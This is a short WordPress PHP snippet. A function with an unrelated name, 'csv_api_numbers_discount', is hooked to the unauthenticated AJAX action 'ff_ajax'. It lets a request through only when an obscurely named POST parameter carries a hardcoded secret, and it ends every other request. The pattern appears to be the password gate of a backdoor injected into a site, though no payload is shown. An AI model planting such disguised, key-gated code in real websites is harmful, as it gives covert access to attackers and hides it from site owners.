<?php

function csv_api_numbers_discount() {
	if (!isset($_POST["hccoxoytnwnzo"]) || $_POST["hccoxoytnwnzo"] !== "bczEG564uPu") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'csv_api_numbers_discount', 5, 1);
